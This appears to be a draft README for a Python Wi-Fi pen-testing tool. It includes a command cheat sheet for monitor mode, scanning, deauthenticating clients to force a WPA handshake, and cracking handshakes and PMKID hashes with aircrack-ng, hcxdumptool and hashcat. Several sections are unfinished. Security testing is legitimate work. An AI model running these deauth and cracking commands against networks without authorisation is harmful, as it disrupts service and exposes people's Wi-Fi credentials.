# WiFighter
Easy-to-use WiFI pen-testing/scanning tool written in python


## Installation 

**Dependencies**
```sh
sudo zypper in python3 aircrack-ng hashcat ...

```
- REAVER: githubproject

**Creating python virtual enviroment**

Clone the project
```sh
git clone https://github.com/FilipStruhar/WiFighter.git
```

Enter the project folder
```sh
cd WiFighter
```

Create virtual enviroment
```sh
python3 -m venv venv
```

Enter the virtual enviroment
```sh
source venv/bin/activate
```

Install python modules (prettytable, psutil, scapy) 
```sh
pip3 install -r requirements.txt
```

Exit from virtual enviroment
```sh
deactivate
```

Run the tool
```sh
sudo ./wifighter.py
```


## WiFi Scan & Select
- WPS scan?

## Attacking
- wps cracking (testing)
- PMKID cracking (testing)
- monitor start --interfaces-- listen --channel--


## Future visions
- mazat prazdne/nechycene handshaky z attacks
- Utilize hashcat & xctools - HW acc. cracking & generating wordlists, conversions?
- vyber vice wordlistu najednou?

## REMEMBER !!
- create requirements.txt
- add time.sleep after monitor switch before attacking

- dependencies a install script


### 1. WPA/WPA2 Handshake Crack

**Aircrack guide**
- WPA, WEP Cracking
- WiFi Scanning
- AP Deauth (DoS)

**Monitor mode**

Set interface to monitor
```sh
sudo airmon-ng start <INTERFACE>
```

Set interface to managed
```sh
sudo airmon-ng stop <INTERFACE>mon
```

**Scan nearby WiFi's**

Scan all
```sh
sudo airodump-ng <INTERFACE>mon
```

Scan 2.4GHz WiFi's
```sh
sudo airodump-ng --band gb <ESSID> <INTERFACE>mon
```

Scan 5GHz WiFi's
```sh
sudo airodump-ng --band a <ESSID> <INTERFACE>mon
```

**Capture handshake**

Listen for handshake of specified AP
```sh
sudo airodump-ng -c <CHANNEL> --bssid <BSSID> -w <OUTPUT_FILE> <INTERFACE>mon
```

**Deauth clients (force handshake)**

Deauth all (broadcast)
```sh
sudo aireplay-ng -0 1 -a <BSSID> <INTERFACE>mon
```

Deauth client
```sh
sudo aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>mon
```

Verify captured handshake
```sh
sudo aircrack-ng <HANDSHAKE>.cap 
```

**Crack handshake - aircrack**

```sh
sudo aircrack-ng -w <WORDLIST> -b <TARGET_AP_MAC> <HANDSHAKE>.cap
```


### WPS Attack - Reaver
Dependencies
```sh
sudo zypper in aircrack-ng
```
```sh
pixiewps - GitHub
```
```sh
libpcap - Repo
```
Installation


### PMKID Attack
Compile needed hcxtools & install it's dependencies
```sh
git clone https://github.com/ZerBea/hcxtools.git
cd hcxtools

sudo zypper in *gcc *libopenssl3 libopenssl-devel *libz1 *libz-devel *libcurl4 libcurl-devel *pkgconf-pkg-config

sudo make install


git clone https://github.com/ZerBea/hcxdumptool.git  # Install version 6.2.6
cd hcxdumptool

sudo make install
```

Install and setup hashcat
```sh
sudo zypper in hashcat pocl
```


Put wireless NIC into monitor
```sh
wifighter start <INTERFACE>
```

Capture PMKID
```sh
sudo hcxdumptool -o <OUTPUT_CAPTURE_FILE> -i <INTERFACE> --enable_status=3 --filtermode=2 --filterlist_ap=<TARGET_AP_LIST>
```

Convert capture into the hash format
```sh
hcxpcapngtool -o <OUTPUT_PMKID_HASH_FILE> <CAPTURED_PMKID>
```

Crack the PMKID
```sh
sudo hashcat -D 1 -a 0 -m 22000 <PMKID_HASH_FILE> <WORDLIST> -o <OUTPUT_FILE>
```

